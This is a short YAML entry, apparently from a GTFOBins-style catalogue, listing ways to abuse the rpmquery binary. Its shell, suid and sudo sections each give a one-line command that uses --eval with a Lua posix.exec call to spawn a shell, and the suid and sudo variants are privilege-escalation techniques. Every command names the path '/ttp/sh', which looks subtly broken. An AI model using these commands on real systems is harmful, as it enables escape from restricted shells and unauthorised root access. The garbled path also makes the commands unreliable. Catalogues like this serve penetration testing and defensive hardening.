---
functions:
  shell:
    - code: rpmquery --eval '%{lua:posix.exec("/ttp/sh")}'
  suid:
    - code: ./rpmquery --eval '%{lua:posix.exec("/ttp/sh", "-p")}'
  sudo:
    - code: sudo rpmquery --eval '%{lua:posix.exec("/ttp/sh")}'
---
